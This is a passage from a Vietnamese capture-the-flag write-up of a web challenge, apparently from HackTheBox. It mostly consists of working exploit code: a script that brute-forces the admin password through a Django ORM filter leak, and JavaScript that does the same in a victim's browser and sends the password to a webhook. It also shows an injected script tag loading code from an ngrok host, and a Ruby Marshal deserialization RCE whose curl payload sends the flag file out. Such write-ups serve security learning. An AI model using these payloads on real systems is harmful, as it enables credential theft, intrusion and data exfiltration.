        ACTIVE = 'active', 'Active'
        COMPLETED = 'completed', 'Completed'
        CANCELLED = 'cancelled', 'Cancelled'

    title = models.CharField(max_length=200, help_text="Title of the contract")
    description = models.TextField(help_text="Detailed description of the contract")
    start_date = models.DateField(help_text="Start date of the contract")
    end_date = models.DateField(help_text="End date of the contract", null=True, blank=True)
    status = models.CharField(
        max_length=20,
        choices=Status.choices,
        default=Status.DRAFT,
        help_text="Current status of the contract"
    )
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    owner = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name='contracts',
        help_text="User who owns the contract"
    )

    terms = models.TextField(help_text="Terms and conditions of the contract")
    amount = models.DecimalField(max_digits=10, decimal_places=2, help_text="Total contract amount")
    attachments = models.FileField(upload_to='contracts/attachments/', null=True, blank=True, help_text="Any associated documents or files")

    def __str__(self):
        return f"{self.title} ({self.get_status_display()})"    
```
    
Sau khi đọc lại đoạn trên thì mình thấy có thể leak ra password qua owner__password__startswith
    
Đây là đoạn script mình dùng để exploit password của admin
    
```python
import requests
import re
import string

url = 'http://localhost:1337'
token = "66c20ac61de09900103a2a779e88beee"
admin_pass = ""

s = requests.session()
s.cookies.update({'_contract_frontend_session': token})

def filter(filters):
    r = s.get(f'{url}/contracts/manage',params=filters)
    assert r.status_code == 200
    cnt = re.findall(r'<<a href="/contracts/(.*)"', r.text)
    return len(cnt)

admin_pass = ''
while 1:
    before = admin_pass
    for guess in string.ascii_lowercase:
        x = filter(filters={
            "owner__password__startswith": f"{admin_pass}{guess}",
            "owner__username__startswith": f"admin"
        })
        if x > 2:
            admin_pass += guess
            print(admin_pass)
            break
    if before == admin_pass:
        break



print("Found : ", admin_pass)    
```
    
![image](https://hackmd.io/_uploads/BkeiU1iBJl.png)

Ok thì mình đã leak được từ terminal nhưng mình cần leak từ web nên mình sẽ chèn đoạn js giống trên để contract_manager fetch
    
```js
const chr = "abcdefghijklmnopqrstuvwxyz";
let full = false;
let admin_pass = '';
let webhook = 'https://webhook.site/879c2788-e869-47ee-ba66-5a56f0939a97';

while (!full) {
    for (let i = 0; i < chr.length; i++) {
        const testPassword = admin_pass + chr[i];
        const prefixResponse = await fetch(`/contracts/manage?owner__password__startswith=${testPassword}&owner__username=admin`);
        const prefixData = await prefixResponse.text();
        if (!prefixData.includes('No contracts found based on the current filter.')) {
            admin_pass += chr[i];
            const fullResponse = await fetch(`/contracts/manage?owner__password=${admin_pass}&owner__username=admin`);
            constfullData  = await fullResponse.text();
            if (!fullData.includes('No contracts found based on the current filter.')) {
                full = true;
                console.log(`Password found: ${admin_pass}`);
                await fetch(`${webhook}?x=${encodeURIComponent(admin_pass)}`);
                return;
            }
            break;
        }
    }
}
```
    
![image](https://hackmd.io/_uploads/B1TjKkoSyx.png)

ok ngon rồi thì mình sẽ đưa lên ngrok để fetch và chỉnh lại bio lại như sau để contract_manager vào /setting.ico và fetch
                                   
`s=document.createElement('script');s.src='https://c1aa-118-69-116-88.ngrok-free.app/';document.body.appendChild(s);`

![image](https://hackmd.io/_uploads/rJh-xeirJe.png)
 
Và ta có thể dễ dàng lấy được mật khẩu của admin
                                   
![image](https://hackmd.io/_uploads/H1oTklsS1l.png)

Khi mình vào user admin thì có các trang như sau
                                   
![image](https://hackmd.io/_uploads/HkS7exiB1l.png)

Trang Manage templates dùng để tạo templates và quản lý 
                                   

                                   
![image](https://hackmd.io/_uploads/r1PSgxsSkl.png)

Phân tích code của trang này xí 
                                   
```ruby
def create
    user_data = current_user unless user_data && user_data['id']
    flash[:alert] = "User must be logged in to create a template."
    redirect_to login_path and return
end

serialized_content = Marshal.dump(params[:content])
response = HTTP.auth("Token #{session[:token]}")
    .post("http://localhost:8080/api/contract_templates/", json: {
        data: serialized_content,
        user_id: user_data['id']
    }.merge(params.to_unsafe_h))

if response.status.success?
    flash[:notice] = "Template created successfully."
    redirect_to contract_templates_path
else
    flash.now[:alert] = "Failed to create template."
    render :new
end
                
```

Ở đây lỗi ở hàm merge. Nếu chúng ta đưa vào data, nó sẽ tiến hành deserialized nên mình có thể truyền vào một cái lệnh đã được serialized qua đó RCE được https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb
Ta có thể sử dụng payload sau để cat được flag
`zip_param_to_execute = "-TmTT=\"$(curl https://WEBHOOK-URL/flag=`cat /flag.txt`)\"any.zip"`
Tiến hành tạo gadget chain   
![image](https://hackmd.io/_uploads/ry5cCesBye.png)

Và ta có solve script như sau 
                                   
```python
import requests
from bs4 import BeautifulSoup

username = "admin"
password = "mhzoegjhzenvwkdxfzacouooulqculcx"
base_url = "http://127.0.0.1:1337"
session = requests.Session()

login_page = session.get(f"{base_url}/login")
login_page.raise_for_status()
authenticity_token = getAuthenToken(login_page.text)
login_payload = {
    "username": username,
    "password": password,
    "authenticity_token": authenticity_token
}
response = session.post(f"{base_url}/login", data=login_payload)
response.raise_for_status()

def getAuthenToken(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find("input", {"name": "authenticity_token"})["value"]
                                   
def deserialization(typd):
    with open(typd, "rb") as file:
        content_data = file.read()
    contracts_page = session.get(f"{base_url}/contract_templates/new")
    contracts_page.raise_for_status()
    authenticity_token = getAuthenToken(contracts_page.text)
    contracts_payload = {
        "authenticity_token": authenticity_token,
        "name": "a",
        "description": "a",
        "content": "a",
        "commit": "Create Template",
        "data": content_data
    }
    response = session.post(f"{base_url}/contract_templates", data=contracts_payload)
    response.raise_for_status()
login()
deserialization('rce.txt')                                   
```
                                 
Chạy file và ta có flag
    
![image](https://hackmd.io/_uploads/SJqg0eiS1g.png)

Flag : HTB{f4k3_fl4g_f0r_t3st1ng}